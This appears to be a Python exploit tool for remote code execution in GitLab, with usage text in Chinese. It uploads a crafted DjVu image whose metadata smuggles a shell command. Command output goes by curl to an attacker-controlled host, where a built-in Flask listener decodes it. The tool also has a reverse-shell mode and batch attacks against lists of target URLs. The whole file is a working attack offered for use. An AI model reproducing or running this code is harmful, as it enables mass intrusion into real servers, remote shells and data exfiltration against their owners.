from flask import Flask
from flask import request
import base64
import threading
import requests
import warnings
import optparse
import sys
import logging
import os
from bs4 import BeautifulSoup
from multiprocessing import Pool

warnings.filterwarnings('ignore')
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

@app.route("/")
def index():
    try:
        base64data=request.args.get("name")
        print(base64data)
        if len(base64data)>0:
            print("[*] The Command Result")
            print(base64.b64decode(base64data).decode())
        return "ok"
    except Exception as error:
        pass

def tmp(args):
    return exploit(*args)

def exploit(url,host,cmd):
    payload = "curl http://{}/?name=`{}|base64 -w0`".format(host,cmd)
    print("[*] exploit RCE Testing")
    result = {}
    session = requests.Session()
    try:
        r = session.get(url.rstrip("/") + "/users/sign_in", verify=False)
        soup = BeautifulSoup(r.text, features="lxml")
        token = soup.findAll('meta')[16].get("content")
        print("csrf token:{}".format(token))
        data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{"+payload+"} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
            "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
        flag = 'Failed to process image'
        req = session.post(url.rstrip("/") + "/uploads/user", data=data, headers=headers, verify=False)
        if flag in req.text:
            print("[+] url:{} gitlab rce ok !!!".format(url))
            #print(req.url)

    except Exception as e:
        if str(e)=="list index out of range":
            pass
        else:
            print(e)


if __name__ == '__main__':
    parser=optparse.OptionParser()
    parser.add_option("-r",dest="reverseshell",help="反弹shell语句执行",action="store_true")
    parser.add_option("-s",dest="proxy",help="flask+ngrok代理",action="store_true")
    parser.add_option("-u",dest="url",help="目标url")
    parser.add_option("-f",dest="file",help="目标txt")
    parser.add_option("-t",dest="host",help="命令结果返回url/domain")
    parser.add_option("-c",dest="cmd",help="批量时要执行的命令")
    option,args=parser.parse_args()
    if (option.proxy and option.host and option.url):
        t = threading.Thread(target=app.run, args=("0.0.0.0", 80))
        t.start()
        t.join(1)
        while True:
            cmd=input("command>")
            if cmd=="exit":
                break
            exploit(url = option.url,host=option.host,cmd=cmd)
        sys.exit()
    elif (option.host and option.url):
        while True:
            cmd=input("command>")
            if cmd=="exit":
                break
            exploit(url = option.url,host=option.host,cmd=cmd)
        sys.exit()
    elif (option.url and option.reverseshell):
        name="reverseshell.txt"
        if os.path.exists(name):
            cmd=open(name,"r",encoding="utf-8").read()
            print("[*] Reverse Shell")
            exploit(url=option.url, host=option.url, cmd=cmd)
        else:
            print("[-] reverseshell.txt Not Found")

    elif (option.proxy and option.host and option.file and option.cmd) or (option.host and option.file and option.cmd):
        filename=option.file
        if os.path.exists(filename):
            if len(sys.argv)>7:
                t = threading.Thread(target=app.run, args=("0.0.0.0", 80))
                t.start()
                t.join(1)

            urllist=open(filename,"r",encoding="utf-8").read().split("\n")

            host=option.host
            hostlist="{}\n".format(host)*len(urllist)
            hostlist=hostlist.split("\n")
            del hostlist[-1]

            cmdlist="{}\n".format(option.cmd)*len(urllist)
            cmdlist=cmdlist.split("\n")
            del cmdlist[-1]

            zipargs=list(zip(urllist,hostlist,cmdlist))
            p=Pool()
            p.map(tmp,zipargs)

        else:
            print("[-] not found file:{}".format(filename))

    else:
        print('''单个shell执行 (本地flask开启并指定ngrok穿透的域名)
python rce.py -s -t <ngrok_domain> -u <目标url>

单个shell执行 (指定远程接收端)
python rce.py -t <远程接收端的IP> -u <目标url>

反弹shell命令执行
python rce.py -u <目标url> -r

批量shell执行 (本地flask开启并指定ngrok穿透的域名)
python rce.py  -s -t <ngrok_domain> -f url.txt -c <要执行的命令>

批量shell执行 (指定远程接收端)
python rce.py -t <远程接收端的IP> -f url.txt -c <要执行的命令>''')
        parser.print_help()